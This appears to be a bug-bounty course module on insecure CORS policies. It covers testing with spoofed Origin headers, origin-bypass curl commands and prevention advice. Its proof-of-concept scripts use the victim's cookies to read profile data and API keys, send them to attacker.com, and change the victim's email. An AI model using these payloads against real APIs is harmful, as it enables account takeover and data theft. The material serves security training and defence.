# 🌍 Module 12: Insecure CORS

> **Level:** 🔴 Advanced | **Time:** ~2 hours | **Prerequisites:** Module 01-11

---

## 📖 Overview

Cross-Origin Resource Sharing (CORS) is a browser mechanism that allows web applications on one origin to make requests to a different origin. Misconfigured CORS policies can allow malicious websites to read sensitive data from APIs while using the victim's credentials — leading to data theft and account compromise.

---

## ❓ Why It Matters

CORS misconfigurations are extremely common in modern single-page applications that use APIs. A single misconfigured CORS policy can expose your entire API response to any website on the internet. This is consistently found and rewarded in bug bounty programs, often at **$1,000 to $10,000**.

---

## 🌍 Real-World Example

A researcher found that a major financial platform's API responded with `Access-Control-Allow-Origin: [reflected origin]` and `Access-Control-Allow-Credentials: true` for any origin. A malicious page could make authenticated API calls and read account balances, transaction history, and personal information. This earned a **$7,500 high severity bounty**.

---

## 📋 Step-by-Step Methodology

### Understanding CORS Flow

```
Legitimate Cross-Origin Request:
    Browser → GET /api/data → api.target.com
    api.target.com → Access-Control-Allow-Origin: trusted.com
    Browser: "Request is from trusted.com ✓, allow JS to read response"

Attack Scenario:
    Victim visits evil.com
    evil.com JS → GET /api/data → api.target.com (with victim's cookies!)
    If CORS misconfigured: api.target.com → Access-Control-Allow-Origin: evil.com
    evil.com JS: Can now READ the response with victim's data!
```

### Testing for CORS Misconfigurations

```bash
# Step 1: Send request with Origin header
curl -H "Origin: https://evil.com" \
     -H "Cookie: session=victim_token" \
     -I https://api.target.com/user/profile

# Step 2: Check response headers
# VULNERABLE if:
# Access-Control-Allow-Origin: https://evil.com     ← reflects your origin
# Access-Control-Allow-Credentials: true             ← allows cookies
```

---

## 🛠️ Tools Used

| Tool | Purpose |
|------|---------|
| **Burp Suite** | Intercept and test CORS |
| **curl** | Command-line CORS testing |
| **CORStest** | Automated CORS scanner |
| **corsy** | CORS misconfiguration scanner |

---

## 💡 Payload Examples

### Testing CORS with Burp

```
1. Intercept API request in Burp
2. Add/modify Origin header:
   Origin: https://evil.com
   
3. Check response for:
   Access-Control-Allow-Origin: https://evil.com  ← Vulnerable!
   Access-Control-Allow-Credentials: true          ← Can steal data!
```

### CORS Bypass Techniques

```bash
# Test various origin bypass techniques

# Null origin
curl -H "Origin: null" https://api.target.com/data

# Subdomain trust
curl -H "Origin: https://evil.target.com" https://api.target.com/data
curl -H "Origin: https://target.com.evil.com" https://api.target.com/data

# Pre/post-fix attacks (if regex is used)
curl -H "Origin: https://evil-target.com" https://api.target.com/data
curl -H "Origin: https://notreallytarget.com" https://api.target.com/data

# HTTP vs HTTPS
curl -H "Origin: http://target.com" https://api.target.com/data
```

### Exploit Proof of Concept

```html
<!-- Exploit: Read sensitive API data as victim -->
<html>
  <body>
    <h1>CORS PoC - Stealing User Data</h1>
    <pre id="result"></pre>
    
    <script>
      var xhr = new XMLHttpRequest();
      xhr.open('GET', 'https://api.target.com/user/profile', true);
      xhr.withCredentials = true;    // Include victim's cookies!
      
      xhr.onload = function() {
        // Send stolen data to attacker
        var data = xhr.responseText;
        document.getElementById('result').innerText = data;
        
        // Send to attacker server
        fetch('https://attacker.com/steal', {
          method: 'POST',
          body: data
        });
      };
      
      xhr.send();
    </script>
  </body>
</html>

<!-- Using fetch() - modern approach -->
<script>
  fetch('https://api.target.com/user/account-details', {
    credentials: 'include'    // Include victim's cookies
  })
  .then(r => r.json())
  .then(data => {
    // Send stolen data to attacker
    fetch('https://attacker.com/exfil?data=' + btoa(JSON.stringify(data)));
  });
</script>
```

### Impact Demonstration

```javascript
// Higher-impact CORS exploit: Change email/password as victim
fetch('https://api.target.com/user/email', {
    method: 'POST',
    credentials: 'include',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({email: 'attacker@evil.com'})
})
.then(r => r.json())
.then(console.log);

// Extract API keys
fetch('https://api.target.com/user/api-keys', {credentials: 'include'})
    .then(r => r.json())
    .then(keys => fetch('https://attacker.com/steal?keys=' + JSON.stringify(keys)));
```

---

## 🛡️ Prevention

| Issue | Prevention |
|-------|-----------|
| Reflect any origin | Only allow specific trusted origins |
| Trust null origin | Never trust `null` origin in production |
| Overly broad regex | Use exact string matching for allowed origins |
| Allow all + credentials | Never combine `*` with `credentials: true` |

```python
# Secure CORS configuration example
ALLOWED_ORIGINS = [
    'https://app.example.com',
    'https://www.example.com'
]

def get_cors_headers(request_origin):
    if request_origin in ALLOWED_ORIGINS:
        return {
            'Access-Control-Allow-Origin': request_origin,
            'Access-Control-Allow-Credentials': 'true',
            'Vary': 'Origin'    # Important for caching!
        }
    # If not in whitelist, don't add CORS headers
    return {}
```

---

## 🧪 Practice Labs

| Lab | Link | Exercise |
|-----|------|---------|
| PortSwigger CORS | [portswigger.net/web-security/cors](https://portswigger.net/web-security/cors) | 4 CORS labs |
| TryHackMe | [tryhackme.com](https://tryhackme.com) | CORS-related rooms |
| HackTheBox | [hackthebox.com](https://hackthebox.com) | API security challenges |

---

<div align="center">

[← Module 11: Security Misconfigurations](../11.%20Security%20Misconfigurations/README.md) | [Next Module: File Inclusion →](../13.%20File%20Inclusion/README.md)

</div>
